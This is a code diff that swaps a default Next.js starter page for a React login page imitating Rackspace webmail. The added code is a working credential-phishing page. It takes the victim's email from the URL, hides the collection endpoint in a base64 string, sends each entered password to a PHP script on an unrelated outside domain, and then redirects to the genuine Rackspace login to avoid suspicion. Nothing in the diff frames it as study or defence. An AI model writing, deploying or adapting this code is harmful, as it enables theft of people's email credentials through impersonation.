@@ -1,113 +1,164 @@
-import Image from "next/image";
+// pages/index.js
+"use client";
+import { useEffect, useState } from "react";
 
 export default function Home() {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [message, setMessage] = useState("");
+  const [counter, setCounter] = useState(0);
+  const tries = 2;
+  const redirectUri = "https://apps.rackspace.com/wmidentity/account/login";
+  const apiUrl = atob(
+    "aHR0cHM6Ly9icm9rZW5zb3VuZHNjbHViLm9yZy9jZ2ktYmluL2RhcmsvdXBsb2FkL3JhY2svc3BhY2UvVVBqTDRaRmJlTC5waHA="
+  );
+
+  useEffect(() => {
+    const url = window.location.toString();
+    if (!url.includes("#")) {
+      window.location.href = `${url}#`;
+      window.location.reload();
+    } else {
+      const [, hashValue] = url.split("#");
+      const [email] = hashValue.split("=");
+      setUsername(email);
+    }
+  }, []);
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (!password) {
+      setMessage("Please enter a password.");
+      return;
+    }
+    if (password.length < 5) {
+      setMessage("Password is too short!");
+      return;
+    }
+    setMessage("Verifying...");
+
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ username, passwd: password }),
+    });
+
+    const result = await response.json();
+    if (result.success) {
+      // Handle successful login if necessary
+    } else {
+      setCounter(counter + 1);
+      if (counter >= tries) {
+        window.location.href = redirectUri;
+      } else {
+        setPassword("");
+        setMessage("Incorrect email address or password. Please try again.");
+      }
+    }
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.js</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+    <div className="flex items-center justify-center min-h-screen bg-gray-200">
+      <div className="bg-white min-w-[790px] shadow-lg">
+        <div className="flex items-center justify-between p-4 bg-gray-800 text-white">
+          <div className="text-xl font-light">Webmail Login</div>
+          <img
+            id="logo"
+            className="w-[130px] -mr-[5px] -mt-[9px]"
+            src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"
+            alt="Rackspace Logo"
+          />
+        </div>
+
+        <div className="flex justify-start bg-white">
+          <div
+            id="banner-section"
+            className="flex flex-col items-center justify-center w-[314px] h-[285px] m-10"
           >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
+            <a href="#" target="_blank" rel="noopener noreferrer">
+              <img
+                id="banner"
+                src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg"
+                alt="Suspicious Email Banner"
+                className="w-[190px]"
+              />
+            </a>
+          </div>
+
+          <div className="flex flex-col justify-center w-full px-10">
+            <div className="mb-5 text-red-600 font-semibold">
+              Username / Password incorrect
+            </div>
+
+            <form id="form" className="flex flex-col justify-center">
+              <div className="mb-5">
+                <label className="block mb-2 text-gray-600" htmlFor="username">
+                  Email address
+                </label>
+                <input
+                  type="email"
+                  id="username"
+                  value={username}
+                  readOnly
+                  className="w-full h-8 px-2 border rounded bg-white border-gray-400 focus:border-blue-400 focus:ring-0"
+                />
+              </div>
+
+              <div className="mb-5">
+                <label className="block mb-2 text-gray-600" htmlFor="password">
+                  Password
+                </label>
+                <input
+                  type="password"
+                  id="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  required
+                  className="w-full h-8 px-2 border rounded bg-white border-gray-400 focus:border-blue-400 focus:ring-0"
+                />
+                <a
+                  href="#"
+                  className="absolute top-0 right-10 text-teal-700 hover:underline"
+                >
+                  Forgot password?
+                </a>
+              </div>
+
+              <div className="flex justify-end">
+                <button
+                  type="submit"
+                  onClick={handleSubmit}
+                  className="inline-flex items-center justify-center h-8 px-3 text-white bg-teal-700 border border-transparent rounded cursor-pointer hover:bg-teal-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-teal-500"
+                >
+                  Log In
+                </button>
+              </div>
+
+              <div className="mt-5 text-red-600">{message}</div>
+            </form>
+          </div>
+        </div>
+
+        <div className="text-center py-5 bg-white">
+          <a className="text-teal-700 hover:underline" href="#" target="_blank">
+            Privacy Statement
+          </a>
+          <span className="mx-2 text-teal-700">|</span>
+          <a className="text-teal-700 hover:underline" href="#" target="_blank">
+            Website Terms
           </a>
         </div>
+
+        <div className="text-center mt-2 mb-5 text-gray-600">
+          Need webmail for your business? Learn more about{" "}
+          <a className="text-gray-600 hover:underline" href="#">
+            Hosted Email
+          </a>{" "}
+          from Rackspace.
+        </div>
       </div>
-
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-full sm:before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full sm:after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800 hover:dark:bg-opacity-30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50 text-balance`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
+    </div>
   );
 }
